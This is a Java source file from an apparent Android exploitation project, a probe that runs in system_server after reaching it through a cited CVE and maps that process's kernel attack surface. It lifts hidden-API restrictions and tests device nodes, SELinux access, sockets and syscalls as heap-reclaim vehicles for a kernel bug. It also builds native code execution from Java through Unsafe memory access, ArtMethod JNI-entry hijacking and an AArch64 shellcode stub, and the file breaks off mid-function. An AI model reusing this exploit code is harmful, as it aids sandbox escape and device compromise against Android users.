package dev.pixelksu.domainprobe;

import android.system.ErrnoException;
import android.system.Os;
import android.system.OsConstants;

import java.io.FileDescriptor;
import java.io.RandomAccessFile;

/**
 * The pure-Java mirror of the native {@link Probe}. It exists because the
 * system_server domain (reached via CVE-2026-49881) may not load an app's
 * native library, so the probe that runs there has to be Java. It covers the
 * rows Java can express: socket families, device-node opens, and the SELinux
 * policy queries (validate + compute_av). Syscall probes stay native-only.
 *
 * Output matches the native probe's "%-28s VERDICT detail" format so the
 * system_server column lines up with the others.
 */
public final class JavaProbe {
    private JavaProbe() {}

    private static final int AF_NETLINK = 16, AF_PACKET = 17, PF_KEY = 15,
                             AF_ALG = 38, AF_VSOCK = 40, AF_BLUETOOTH = 31, AF_INET = 2;

    /** Never invoked -- declared only so nativeExec() can read its ArtMethod and,
     *  in the control-transfer step, repoint its JNI entry at our exec page. */
    private static native long jniHook();

    /** The @CriticalNative caller: raw C convention (no JNIEnv/jclass; args in
     *  x0..x6). Declared as a normal native; kernelSurface() flips the runtime-derived
     *  kAccCriticalNative bit on its ArtMethod and points its JNI entry at libc's
     *  syscall(), so sc7(nr, a0..a5) issues syscall(nr, a0..a5) -- 6 syscall args,
     *  enough for mmap. */
    private static native long sc7(long nr, long a0, long a1, long a2, long a3, long a4, long a5);

    // system_server is reached through a one-shot channel (the Telecom load) and
    // cannot be re-entered, and its result is returned by a broadcast whose
    // Binder buffer is ~1 MB -- so it reports the same cheap summaries as the
    // native probe and ships NO INFO content (which would blow that buffer and
    // get the app killed). The full per-row content is in logcat instead.
    private static void info(StringBuilder o, String name, String summary) {
        emit(o, name, 2, summary);
    }
    private static void text(StringBuilder o, String path) {
        try { FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0); Os.close(f); emit(o, path, 2, "readable"); }
        catch (Throwable t) { open(o, path, OsConstants.O_RDONLY); }
    }
    /** Read a proc file whole: one read() is not enough -- procfs answers in short
     *  reads, which silently cut a cmdline name or a mountinfo blob in half. */
    private static String slurp(String path, int cap) {
        try (java.io.FileInputStream f = new java.io.FileInputStream(path)) {
            byte[] b = new byte[cap];
            int off = 0, n;
            while (off < cap && (n = f.read(b, off, cap - off)) > 0) off += n;
            return off <= 0 ? "" : new String(b, 0, off);
        } catch (Throwable t) { return ""; }
    }

    /** One INFO row's content, produced on demand in u:r:system_server:s0. The
     *  caller (TelecomPayload) frames these and pages them over several broadcasts,
     *  since a single Binder transaction cannot carry the multi-MB peer views. */
    static String content(String name) {
        try {
            if (name.equals("mount namespace")) return slurp("/proc/self/mountinfo", 262144);
            if (name.equals("proc visible pids")) return procPids();
            if (name.equals("peer mountinfo readable")) return peerViews();
            if (name.startsWith("/")) return slurp(name, 262144);
        } catch (Throwable t) { return "(content error: " + t + ")\n"; }
        return "(no content)\n";
    }

    /** Every INFO row's content, framed  name  text -- the app attaches
     *  each to its row after the pieces are reassembled. */
    static String allContent() {
        String[] names = { "mount namespace", "proc visible pids", "peer mountinfo readable",
                           "/proc/version", "/proc/slabinfo", "/proc/pagetypeinfo", "/proc/vmallocinfo" };
        StringBuilder c = new StringBuilder();
        for (String n : names) {
            String t = content(n);
            if (t != null && !t.isEmpty()) c.append('\u001e').append(n).append('\u001f').append(t);
        }
        return c.toString();
    }

    /** Full process name: argv[0] from /proc/<pid>/cmdline, because comm is capped
     *  at 15 characters and turns every app process into an unrecognisable stem.
     *  comm is the fallback, in [brackets] so a stem is never mistaken for a full
     *  name: it is all there is when cmdline is empty (kernel threads, zombies) or
     *  unreadable (no AID_READPROC for that pid). */
    private static String procName(String pid) {
        String cl = slurp("/proc/" + pid + "/cmdline", 256);
        StringBuilder b = new StringBuilder();
        // argv[0] ends at the first NUL -- except where a process rewrote its whole
        // command line into one space-joined string, so stop at any whitespace.
        for (int i = 0; i < cl.length(); i++) { char c = cl.charAt(i); if (c <= ' ') break; b.append(c); }
        if (b.length() > 0) return b.toString();
        String comm = slurp("/proc/" + pid + "/comm", 64).trim();
        return "[" + (comm.isEmpty() ? "?" : comm) + "]";
    }

    private static String procPids() {
        String[] names = new java.io.File("/proc").list();
        java.util.ArrayList<int[]> ids = new java.util.ArrayList<>();
        java.util.ArrayList<String> nameL = new java.util.ArrayList<>(), ctxL = new java.util.ArrayList<>();
        if (names != null) for (String n : names) {
            if (n.isEmpty() || !Character.isDigit(n.charAt(0))) continue;
            int pid; try { pid = Integer.parseInt(n); } catch (Exception e) { continue; }
            int uid = -1; try { uid = (int) Os.stat("/proc/" + n).st_uid; } catch (Throwable ignored) {}
            String pctx = slurp("/proc/" + n + "/attr/current", 128).trim(); if (pctx.isEmpty()) pctx = "-";
            ids.add(new int[]{pid, uid}); nameL.add(procName(n)); ctxL.add(pctx);
        }
        int wc = 4, wu = 3;
        for (int i = 0; i < ids.size(); i++) {
            if (nameL.get(i).length() <= 64) wc = Math.max(wc, nameL.get(i).length());
            wu = Math.max(wu, Integer.toString(ids.get(i)[1]).length());
        }
        StringBuilder pl = new StringBuilder("# NAME is argv[0] from /proc/<pid>/cmdline, the full process name; [brackets]\n"
                + "# mark a fallback to the 15-character comm, all there is when cmdline is empty\n"
                + "# (kernel threads, zombies) or unreadable (no AID_READPROC for that pid).\n");
        pl.append(String.format("%-6s %-" + wu + "s %-" + wc + "s %s%n", "PID", "UID", "NAME", "CONTEXT"));
        for (int i = 0; i < ids.size(); i++)
            pl.append(String.format("%-6d %-" + wu + "d %-" + wc + "s %s%n", ids.get(i)[0], ids.get(i)[1], nameL.get(i), ctxL.get(i)));
        return pl.toString();
    }

    /* --- mountinfo, canonicalised (mirrors the native probe) ------------------
     * A mountinfo line is
     *   id parent maj:min root mountpoint opts [propagation...] - fstype src sopts
     * where id, parent and the propagation ids are per-namespace counters: two
     * processes with an identical mount tree disagree on every one of them, so
     * keeping them makes every peer look distinct and turns this row into a
     * multi-MB dump of near-identical trees. Drop the ids, keep the propagation
     * TYPE, and identical views group; the ones that differ are shown as a diff. */
    private static final String[] CANON_FIELDS =
        {"mountpoint", "root", "dev", "opts", "propagation", "fstype", "source", "superopts"};
    private static final int DIFF_MAX = 80;
    private static final int REFS = 3;      // views a diff may be taken against

    private static String canonLine(String line) {
        String[] f = line.split(" ");
        if (f.length < 7) return null;
        StringBuilder prop = new StringBuilder();
        int i = 6;
        for (; i < f.length && !f[i].equals("-"); i++) {
            String t = f[i];
            int c = t.indexOf(':');
            if (c > 0) t = t.substring(0, c);            // shared:34 -> shared
            if (prop.length() > 0) prop.append(',');
            prop.append(t);
        }
        if (i >= f.length) return null;                  // no "-" separator
        String fstype = i + 1 < f.length ? f[i + 1] : "-";
        String src    = i + 2 < f.length ? f[i + 2] : "-";
        String sopts  = i + 3 < f.length ? f[i + 3] : "-";
        return f[4] + " " + f[3] + " " + f[2] + " " + f[5] + " "
             + (prop.length() == 0 ? "-" : prop) + " " + fstype + " " + src + " " + sopts;
    }

    /** Sorted, because mountinfo is in mount order -- a namespace's history rather
     *  than its contents, so two processes that mounted the same things in a
     *  different order would otherwise be two views whose diff is empty. */
    private static java.util.ArrayList<String> canonView(String raw) {
        java.util.ArrayList<String> v = new java.util.ArrayList<>();
        for (String l : raw.split("\n")) { String c = canonLine(l); if (c != null) v.add(c); }
        java.util.Collections.sort(v);
        return v;
    }

    /** mountpoint+root+dev: the mount's identity, so one whose options or
     *  propagation changed reads as changed rather than removed and added. */
    private static String ident(String canon) {
        int sp = 0, i = 0;
        for (; i < canon.length(); i++) if (canon.charAt(i) == ' ' && ++sp == 3) break;
        return canon.substring(0, i);
    }

    /** "~ /mountpoint  propagation: shared -> master" -- only the fields that moved. */
    private static String change(String was, String now) {
        String[] w = was.split(" "), n = now.split(" ");
        StringBuilder b = new StringBuilder("~ ").append(n[0]);
        for (int i = 1; i < CANON_FIELDS.length; i++) {
            String a = i < w.length ? w[i] : "-", c = i < n.length ? n[i] : "-";
            if (!a.equals(c)) b.append("  ").append(CANON_FIELDS[i]).append(": ").append(a).append(" -> ").append(c);
        }
        return b.toString();
    }

    private static String peerViews() {
        String[] dir = new java.io.File("/proc").list();
        int me = Os.getpid(), peers = 0;
        java.util.LinkedHashMap<String, java.util.ArrayList<String>> views = new java.util.LinkedHashMap<>();
        if (dir != null) for (String n : dir) {
            if (n.isEmpty() || !Character.isDigit(n.charAt(0))) continue;
            int pid; try { pid = Integer.parseInt(n); } catch (Exception e) { continue; }
            if (pid == me) continue;
            String raw = slurp("/proc/" + n + "/mountinfo", 262144);
            if (raw.isEmpty()) continue;
            peers++;
            String key = String.join("\n", canonView(raw));
            views.computeIfAbsent(key, k -> new java.util.ArrayList<>()).add(pid + ":" + procName(n));
        }
        if (peers == 0) return "(no peer mountinfo readable from this domain)\n";
        if (views.isEmpty()) return "(peer mountinfo readable but empty from this domain)\n";

        java.util.ArrayList<java.util.Map.Entry<String, java.util.ArrayList<String>>> ord =
                new java.util.ArrayList<>(views.entrySet());
        ord.sort((a, b) -> b.getValue().size() - a.getValue().size());   // most-shared view is the base

        /* Reference views: the few most-shared ones. Every other view is diffed against
         * whichever it is closest to, not always against view 1 -- view 1 is init's tree
         * and every app namespace differs from it in the same ~100 lines, which is that
         * same diff repeated once per app. */
        int nv = ord.size(), nrefs = Math.min(REFS, nv);
        java.util.ArrayList<java.util.LinkedHashMap<String, String>> refs = new java.util.ArrayList<>();
        for (int r = 0; r < nrefs; r++) {
            java.util.LinkedHashMap<String, String> byId = new java.util.LinkedHashMap<>();
            for (String l : ord.get(r).getKey().split("\n")) byId.put(ident(l), l);
            refs.add(byId);
        }

        StringBuilder idx = new StringBuilder(), det = new StringBuilder();
        for (int oi = 0; oi < nv; oi++) {
            java.util.ArrayList<String> who = ord.get(oi).getValue();
            java.util.List<String> view = java.util.Arrays.asList(ord.get(oi).getKey().split("\n"));
            String whoS = String.join(" ", who.subList(0, Math.min(5, who.size())))
                    + (who.size() > 5 ? " +" + (who.size() - 5) + " more" : "");
            if (oi == 0) {
                idx.append(String.format("%5d %6d %7d %18s  %s%n", 1, who.size(), view.size(), "base", whoS));
                det.append(String.format("%n===== view 1/%d · %d pid%s · %d mounts · base, shown in full =====%n  %s%n%n",
                        nv, who.size(), who.size() == 1 ? "" : "s", view.size(), whoS));
                for (String l : view) det.append(l).append('\n');
                continue;
            }
            int best = -1, bestCost = 0, ba = 0, bm = 0, bc = 0;
            for (int r = 0; r < nrefs; r++) {
                if (r == oi) continue;
                java.util.LinkedHashMap<String, String> ref = refs.get(r);
                int a = 0, c = 0, m = 0;
                java.util.HashSet<String> seen = new java.util.HashSet<>();
                for (String l : view) {
                    String id = ident(l);
                    seen.add(id);
                    String b = ref.get(id);
                    if (b == null) a++; else if (!b.equals(l)) c++;
                }
                for (String id : ref.keySet()) if (!seen.contains(id)) m++;
                if (best < 0 || a + m + c < bestCost) { best = r; bestCost = a + m + c; ba = a; bm = m; bc = c; }
            }
            java.util.LinkedHashMap<String, String> ref = refs.get(best);
            StringBuilder body = new StringBuilder();
            java.util.HashSet<String> seen = new java.util.HashSet<>();
            int printed = 0;
            for (String l : view) {
                String id = ident(l);
                seen.add(id);
                String b = ref.get(id);
                if (printed >= DIFF_MAX) continue;
                if (b == null) { body.append("+ ").append(l).append('\n'); printed++; }
                else if (!b.equals(l)) { body.append(change(b, l)).append('\n'); printed++; }
            }
            for (java.util.Map.Entry<String, String> e : ref.entrySet())
                if (!seen.contains(e.getKey()) && printed < DIFF_MAX) { body.append("- ").append(e.getValue()).append('\n'); printed++; }
            int total = ba + bm + bc;
            if (total > printed) body.append("  (").append(total - printed).append(" more differing mount")
                    .append(total - printed == 1 ? ")" : "s)").append('\n');
            String d = "+" + ba + "/-" + bm + "/~" + bc + " vs " + (best + 1);
            idx.append(String.format("%5d %6d %7d %18s  %s%n", oi + 1, who.size(), view.size(), d, whoS));
            det.append(String.format("%n===== view %d/%d · %d pid%s · %d mounts · %s =====%n  %s%n",
                    oi + 1, nv, who.size(), who.size() == 1 ? "" : "s", view.size(), d, whoS)).append(body);
        }

        return "READABLE PEER MOUNT VIEWS\n" + peers + (peers == 1 ? " peer" : " peers") + " readable · "
                + nv + (nv == 1 ? " distinct view\n" : " distinct views\n")
                + "grouped on the mount tree itself: per-namespace mount/parent/propagation\n"
                + "ids are dropped, so views that differ only in numbering are one view.\n"
                + "fields: mountpoint root dev opts propagation fstype source superopts\n"
                + "diff: +added / -removed / ~changed mounts, against the listed nearest view\n\n"
                + String.format("%5s %6s %7s %18s  %s%n", "view", "pids", "mounts", "diff", "processes")
                + idx + det;
    }

    /** The pure-Java mirror. It emits the SAME ordered row set as the native
     *  probe's run_all() so system_server shares one denominator with the other
     *  five domains. Rows Java cannot express (raw syscalls, ioctls) are still
     *  emitted, with an explicit "n/a (native-only ...)" verdict -- an omitted row
     *  would make the system_server column one shorter and break parity. */
    public static String run() {
        StringBuilder o = new StringBuilder();

        // Lift the hidden-API blocklist for this (app-classloader) process so the
        // reflective hidden-Os probes below resolve. Idempotent and guarded; the
        // system_server payload also does it, but doing it here covers every Java
        // domain (untrusted_app, isolated_app, ...) with one call.
        try { org.lsposed.hiddenapibypass.HiddenApiBypass.addHiddenApiExemptions(""); }
        catch (Throwable ignored) {}

        // 1-5: identity + mount view (cheap counts only; content via allContent())
        emit(o, "selinux context", -1, ctx() + " uid=" + Os.getuid());
        try { info(o, "mount namespace", Os.readlink("/proc/self/ns/mnt")); }
        catch (Throwable t) { emit(o, "mount namespace", -1, "readlink failed"); }
        try {
            String[] names = new java.io.File("/proc").list();
            int pids = 0, peers = 0, me = Os.getpid();
            if (names != null) for (String n : names) {
                if (n.isEmpty() || !Character.isDigit(n.charAt(0))) continue;
                int pid; try { pid = Integer.parseInt(n); } catch (Exception e) { continue; }
                pids++;
                if (pid == me) continue;
                try { FileDescriptor f = Os.open("/proc/" + n + "/mountinfo", OsConstants.O_RDONLY, 0); Os.close(f); peers++; }
                catch (Throwable ignored) {}
            }
            info(o, "proc visible pids", pids + " pids");
            if (peers > 0) info(o, "peer mountinfo readable", peers + " peers");
            else emit(o, "peer mountinfo readable", 0, "0 peers");
            try { FileDescriptor f = Os.open("/proc/1/status", OsConstants.O_RDONLY, 0); Os.close(f);
                  emit(o, "/proc/1 status", 1, "readable"); }
            catch (Throwable t) { emit(o, "/proc/1 status", 0, "denied"); }
        } catch (Throwable t) { emit(o, "proc visible pids", -1, t.getClass().getSimpleName()); }

        // 6-13: CVE-2026-46242 reclaim vehicles. These used to be "native-only" (no
        // managed wrapper), but the syscall() entrance now dispatches them for real --
        // see the SYSCALLS rows from structOpts: IPV6_DSTOPTS/HOPOPTS (kmalloc-256),
        // IP_MSFILTER, MCAST_MSFILTER/JOIN_GROUP, IP_OPTIONS/ADD_MEMBERSHIP, IPV6_RTHDR,
        // SO_ATTACH_FILTER, and /dev/ashmem. xattr is covered by syscalls() above. Only
        // this one still has no better route from this domain:
        na(o, "unix-dgram skb", "native-only (skb data floor kmalloc-512 anyway)");

        // 14-24: IPC / DMA / GPU / HID nodes
        open(o, "/dev/binder", OsConstants.O_RDWR);
        open(o, "/dev/hwbinder", OsConstants.O_RDWR);
        open(o, "/dev/vndbinder", OsConstants.O_RDWR);
        open(o, "/dev/dma_heap/system", OsConstants.O_RDONLY);
        open(o, "/dev/dma_heap/system-uncached", OsConstants.O_RDONLY);
        open(o, "/dev/ion", OsConstants.O_RDONLY);
        open(o, "/dev/mali0", OsConstants.O_RDWR);
        open(o, "/dev/kgsl-3d0", OsConstants.O_RDWR);
        open(o, "/dev/nvhost-gpu", OsConstants.O_RDWR);
        open(o, "/dev/uhid", OsConstants.O_RDWR);
        open(o, "/dev/uinput", OsConstants.O_RDWR);

        // 25-39: kernel-info leaks and other nodes
        open(o, "/dev/kmsg", OsConstants.O_RDONLY);
        openNamed(o, "/dev/kmsg (write)", "/dev/kmsg", OsConstants.O_WRONLY);
        open(o, "/proc/kcore", OsConstants.O_RDONLY);
        open(o, "/proc/kallsyms", OsConstants.O_RDONLY);
        open(o, "/proc/config.gz", OsConstants.O_RDONLY);
        String ver = slurp("/proc/version", 512);
        if (!ver.isEmpty()) { String[] parts = ver.split(" ", 4); info(o, "/proc/version", parts.length > 2 ? parts[2] : "readable"); }
        else open(o, "/proc/version", OsConstants.O_RDONLY);
        open(o, "/proc/self/pagemap", OsConstants.O_RDONLY);
        open(o, "/sys/kernel/notes", OsConstants.O_RDONLY);
        open(o, "/sys/kernel/tracing/trace_marker", OsConstants.O_WRONLY);
        open(o, "/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw", OsConstants.O_RDONLY);
        text(o, "/proc/slabinfo");
        text(o, "/proc/pagetypeinfo");
        text(o, "/proc/vmallocinfo");
        open(o, "/dev/fuse", OsConstants.O_RDWR);
        open(o, "/dev/random", OsConstants.O_RDONLY);

        // 40-49: SELinux policy (DirtySepolicy)
        open(o, "/sys/fs/selinux/enforce", OsConstants.O_RDONLY);
        open(o, "/sys/fs/selinux/policy", OsConstants.O_RDONLY);
        open(o, "/sys/fs/selinux/access", OsConstants.O_RDWR);
        open(o, "/sys/fs/selinux/create", OsConstants.O_RDWR);
        open(o, "/sys/fs/selinux/context", OsConstants.O_RDWR);
        validate(o, "selinux type magisk", "u:object_r:magisk_file:s0");
        validate(o, "selinux type ksu", "u:object_r:ksu_file:s0");
        av(o, "av system_server execmem", "u:r:system_server:s0", "u:r:system_server:s0", "process", "execmem");
        av(o, "av zygote execmem", "u:r:zygote:s0", "u:r:zygote:s0", "process", "execmem");
        av(o, "av zygote->magisk memfd", "u:r:zygote:s0", "u:object_r:magisk_file:s0", "file", "execute");

        // 50-62: socket families
        int[] nlp = {0, 6, 12, 4, 16, 15};
        String[] nln = {"netlink_route", "netlink_xfrm", "netlink_netfilter", "netlink_tcpdiag",
                        "netlink_generic", "netlink_kobject_uevent"};
        for (int i = 0; i < nlp.length; i++) socket(o, nln[i], AF_NETLINK, OsConstants.SOCK_RAW, nlp[i]);
        socket(o, "packet_socket",    AF_PACKET,    OsConstants.SOCK_RAW, 0);
        socket(o, "key_socket",       PF_KEY,       OsConstants.SOCK_RAW, 2);
        socket(o, "netlink_audit",    AF_NETLINK,   OsConstants.SOCK_RAW, 9);
        socket(o, "alg_socket",       AF_ALG,       OsConstants.SOCK_SEQPACKET, 0);
        socket(o, "vsock_socket",     AF_VSOCK,     OsConstants.SOCK_STREAM, 0);
        socket(o, "bluetooth_socket", AF_BLUETOOTH, OsConstants.SOCK_RAW, 1);
        socket(o, "raw_inet_socket",  AF_INET,      OsConstants.SOCK_RAW, 255);

        // Syscalls. With the hidden-API blocklist lifted we can now reach the ones
        // android.system.Os actually wraps (public or @hide) by reflection. The
        // execmem test is the pivotal one: if PROT_EXEC anonymous memory is
        // allowed here, native code (hence EVERY syscall) can be run in this
        // domain; if not, we are limited to the wrapped syscalls below.
        syscalls(o);

        // Other managed routes to the kernel that syscalls() does not cover: netlink,
        // sendmsg control messages, AF_PACKET, and the SharedMemory mprotect path.
        // Each is built from the on-device signatures and reported by its real result.
        vehicles(o);

        // Native-code chain: arbitrary R/W (Unsafe), the SharedMemory exec-page attempt
        // (negative here), the ArtMethod layout, and execution via an existing native
        // function -- all proven on device.
        nativeExec(o);

        // The wrapper-LESS syscalls, no longer guessed: dispatched for real through
        // libc syscall() (the @CriticalNative entrance), with SIGSYS masked so a
        // seccomp block returns instead of crashing. Also tests the memexec bypass by
        // asking the kernel for an executable page and EXECUTING from it.
        kernelSurface(o);

        return o.toString();
    }

    /** Reflectively call a static android.system.Os method (hidden ones resolve
     *  once the blocklist is lifted). Throws the underlying target exception so
     *  callers can read ErrnoException.errno. */
    private static Object os(String name, Class<?>[] sig, Object... args) throws Throwable {
        try {
            java.lang.reflect.Method m = Os.class.getMethod(name, sig);
            return m.invoke(null, args);
        } catch (java.lang.reflect.InvocationTargetException e) {
            throw e.getCause() != null ? e.getCause() : e;
        }
    }

    /** Call a libcore.io.Os method on the singleton Libcore.os. Many syscalls
     *  (mmap, munmap, setxattr, ...) live here, not on android.system.Os. With
     *  the blocklist lifted these resolve directly. Note: no mprotect wrapper
     *  exists on either Os on this ART build. */
    private static Object lcos(String name, Class<?>[] sig, Object... args) throws Throwable {
        Object os = Class.forName("libcore.io.Libcore").getField("os").get(null);
        try {
            java.lang.reflect.Method m = Class.forName("libcore.io.Os").getMethod(name, sig);
            return m.invoke(os, args);
        } catch (java.lang.reflect.InvocationTargetException e) {
            throw e.getCause() != null ? e.getCause() : e;
        }
    }

    /** The syscalls android.system.Os wraps: memfd_create (public), and -- via
     *  the lifted blocklist -- prctl and setxattr. The execmem PROT_EXEC test is
     *  native-only here (no managed mprotect wrapper), so this always returns
     *  false; SELinux avc rows carry the executable-memory answer instead. */
    private static boolean syscalls(StringBuilder o) {
        // memfd_create(name, flags): public since API 30.
        try {
            FileDescriptor fd = (FileDescriptor) os("memfd_create",
                    new Class[]{ String.class, int.class }, "dp", 0);
            emit(o, "memfd_create", 1, "ok");
            try { Os.close(fd); } catch (Throwable ignored) {}
        } catch (ErrnoException e) {
            emit(o, "memfd_create", e.errno == OsConstants.EACCES ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) {
            na(o, "memfd_create", "no wrapper (" + t.getClass().getSimpleName() + ")");
        }

        // prctl(PR_GET_DUMPABLE=3): hidden; a no-buffer reachability check.
        try {
            Object r = os("prctl", new Class[]{ int.class, long.class, long.class, long.class, long.class },
                    3, 0L, 0L, 0L, 0L);
            emit(o, "prctl(GET_DUMPABLE)", 1, "ok rc=" + r);
        } catch (ErrnoException e) {
            emit(o, "prctl(GET_DUMPABLE)", e.errno == OsConstants.EACCES ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) {
            na(o, "prctl(GET_DUMPABLE)", "hidden Os.prctl unresolved (" + t.getClass().getSimpleName() + ")");
        }

        // setxattr(path,name,value,flags): hidden libcore.io.Os. Binary-safe user
        // data into the kernel; needs a writable file, so use a temp under the
        // app's private dir path pattern that most domains can write.
        String xpath = "/data/local/tmp/dp_xattr_probe";
        try {
            FileDescriptor xf = Os.open(xpath, OsConstants.O_CREAT | OsConstants.O_WRONLY, 0600);
            Os.close(xf);
            byte[] v = { 0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x44, 0x00 };
            lcos("setxattr", new Class[]{ String.class, String.class, byte[].class, int.class }, xpath, "user.dp", v, 0);
            emit(o, "xattr binary-safe", 1, "setxattr ok (len=8, embedded NULs)");
            try { Os.remove(xpath); } catch (Throwable ignored) {}
        } catch (ErrnoException e) {
            emit(o, "xattr binary-safe", e.errno == OsConstants.EACCES ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) {
            na(o, "xattr binary-safe", "libcore Os.setxattr unresolved (" + t.getClass().getSimpleName() + ")");
        }

        // execmem: the runtime test would be mmap anonymous RW then mprotect
        // PROT_EXEC, but this ART build exposes NO mprotect on any managed Os --
        // verified from the on-device jars, both android.system.Os and libcore.io.Os
        // carry mmap/munmap/mlock/msync yet drop mprotect entirely -- so the PROT_EXEC
        // flip is native-only here. (mmap itself resolves fine; it was the absent
        // mprotect lookup that used to throw and get misattributed to mmap by an
        // over-broad catch.) The SELinux "av <domain> execmem" row above already
        // answers executable-memory reachability for this domain.
        boolean execmem = false;
        na(o, "execmem (mmap+mprotect PROT_EXEC)", "native-only (no mprotect wrapper on this device)");
        return execmem;
    }

    /** Other ways to reach the kernel from a wrapper-only domain. Every call here is
     *  built from the on-device Os/framework signatures (baksmali-verified) and
     *  reports whatever the device actually does -- no a-priori verdict. Hidden
     *  static Os methods go through os(); hidden address/struct classes are built by
     *  reflection; HiddenApiBypass exempts them all. */
    private static void vehicles(StringBuilder o) {
        // 1. AF_NETLINK: socket + bind + sendto a real RTM_GETLINK dump into
        //    NETLINK_ROUTE. This reaches the kernel (allocates an nlmsg/skb of our
        //    bytes), unlike a bare socket create -- an arbitrary-bytes vehicle.
        FileDescriptor nf = null;
        try {
            nf = (FileDescriptor) os("socket", new Class[]{ int.class, int.class, int.class },
                    AF_NETLINK, OsConstants.SOCK_RAW, 0 /*NETLINK_ROUTE*/);
            Object nlAddr = Class.forName("android.system.NetlinkSocketAddress")
                    .getConstructor(int.class, int.class).newInstance(0, 0); // pid 0, groups 0 => kernel
            os("bind", new Class[]{ FileDescriptor.class, java.net.SocketAddress.class }, nf, nlAddr);
            byte[] req = new byte[32];            // nlmsghdr(16) + ifinfomsg(16)
            le32(req, 0, 32);                     // nlmsg_len
            le16(req, 4, 18);                     // nlmsg_type = RTM_GETLINK
            le16(req, 6, 0x0301);                 // NLM_F_REQUEST | NLM_F_DUMP
            le32(req, 8, 1);                      // nlmsg_seq
            int sent = (Integer) os("sendto",
                    new Class[]{ FileDescriptor.class, byte[].class, int.class, int.class, int.class, java.net.SocketAddress.class },
                    nf, req, 0, req.length, 0, nlAddr);
            emit(o, "AF_NETLINK RTM_GETLINK", 1, "socket+bind+sendto ok (" + sent + "B nlmsg to NETLINK_ROUTE)");
        } catch (ErrnoException e) {
            emit(o, "AF_NETLINK RTM_GETLINK", e.errno == OsConstants.EACCES || e.errno == OsConstants.EPERM ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) { na(o, "AF_NETLINK RTM_GETLINK", detail(t)); }
        finally { if (nf != null) try { Os.close(nf); } catch (Throwable ignored) {} }

        // 2. AF_PACKET SOCK_RAW: raw L2 socket create (needs CAP_NET_RAW).
        FileDescriptor pf = null;
        try {
            pf = (FileDescriptor) os("socket", new Class[]{ int.class, int.class, int.class },
                    AF_PACKET, OsConstants.SOCK_RAW, 0x0300 /*htons(ETH_P_ALL)*/);
            emit(o, "AF_PACKET SOCK_RAW", 1, "created");
        } catch (ErrnoException e) {
            emit(o, "AF_PACKET SOCK_RAW", e.errno == OsConstants.EACCES || e.errno == OsConstants.EPERM ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) { na(o, "AF_PACKET SOCK_RAW", detail(t)); }
        finally { if (pf != null) try { Os.close(pf); } catch (Throwable ignored) {} }

        // 3. sendmsg over an AF_UNIX socketpair carrying an SCM_RIGHTS control
        //    message that passes a live fd -- exercises StructMsghdr + StructCmsghdr
        //    (a control-message kmalloc) and fd duplication into the peer.
        FileDescriptor sa = new FileDescriptor(), sb = new FileDescriptor();
        try {
            os("socketpair", new Class[]{ int.class, int.class, int.class, FileDescriptor.class, FileDescriptor.class },
                    1 /*AF_UNIX*/, OsConstants.SOCK_DGRAM, 0, sa, sb);
            java.nio.ByteBuffer[] iov = new java.nio.ByteBuffer[]{ java.nio.ByteBuffer.wrap(new byte[]{ 0x41 }) };
            byte[] cd = new byte[4]; le32(cd, 0, fdInt(sb));   // SCM_RIGHTS payload = peer fd as native int
            Class<?> cmsgCls = Class.forName("android.system.StructCmsghdr");
            Object cmsg = cmsgCls.getConstructor(int.class, int.class, byte[].class)
                    .newInstance(1 /*SOL_SOCKET*/, 1 /*SCM_RIGHTS*/, cd);
            Object cmsgArr = java.lang.reflect.Array.newInstance(cmsgCls, 1);
            java.lang.reflect.Array.set(cmsgArr, 0, cmsg);
            Object msg = Class.forName("android.system.StructMsghdr")
                    .getConstructor(java.net.SocketAddress.class, java.nio.ByteBuffer[].class, cmsgArr.getClass(), int.class)
                    .newInstance(null, iov, cmsgArr, 0);
            int sent = (Integer) os("sendmsg",
                    new Class[]{ FileDescriptor.class, Class.forName("android.system.StructMsghdr"), int.class },
                    sa, msg, 0);
            emit(o, "sendmsg SCM_RIGHTS", 1, "sent " + sent + "B + passed fd over AF_UNIX");
        } catch (ErrnoException e) {
            emit(o, "sendmsg SCM_RIGHTS", e.errno == OsConstants.EACCES || e.errno == OsConstants.EPERM ? 0 : -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) { na(o, "sendmsg SCM_RIGHTS", detail(t)); }
        finally { try { Os.close(sa); } catch (Throwable ignored) {} try { Os.close(sb); } catch (Throwable ignored) {} }

        // (The SharedMemory setProtect(PROT_EXEC) row was removed: setProtect's boolean
        //  return lies -- it reports success while the page stays rw-s. Executable-memory
        //  reachability is settled honestly by memexecBypass(), which reads the maps.)

        // 5. prctl(PR_GET_SECCOMP): read this domain's seccomp mode directly
        //    (0=off, 2=filter) rather than guessing whether a filter is installed.
        try {
            Object r = os("prctl", new Class[]{ int.class, long.class, long.class, long.class, long.class },
                    21 /*PR_GET_SECCOMP*/, 0L, 0L, 0L, 0L);
            emit(o, "prctl(GET_SECCOMP)", 1, "mode=" + r + (((Integer) r) == 2 ? " (filter installed)" : ""));
        } catch (ErrnoException e) {
            emit(o, "prctl(GET_SECCOMP)", -1, "errno=" + OsConstants.errnoName(e.errno));
        } catch (Throwable t) { na(o, "prctl(GET_SECCOMP)", detail(t)); }
    }

    // AArch64 shellcode: movz x0, #0x1337 ; ret  -- returns 0x1337 to the caller.
    private static final int SC_MOVZ = 0xD28266E0, SC_RET = 0xD65F03C0;

    /** Recon for native-code execution from pure Java in a no-JNI domain. Proves the
     *  three primitives and dumps the ArtMethod so the control transfer (next step)
     *  is built from device data, not guessed offsets. All read/alloc only -- no jump
     *  and no ArtMethod write here, so a wrong assumption reports a row, never a
     *  segfault. Everything is grounded in on-device smali:
     *    jdk.internal.misc.Unsafe.{getUnsafe,getLong(J)J,putLong(JJ)V,getInt(J)I,allocateMemory}
     *    java.lang.reflect.Executable.artMethod:J   android.os.SharedMemory.{create,mapReadWrite,setProtect} */
    private static void nativeExec(StringBuilder o) {
        final Object u; final java.lang.reflect.Method uGetLong, uGetInt, uPutLong;
        try {
            Class<?> uc = Class.forName("jdk.internal.misc.Unsafe");
            Object inst = null;
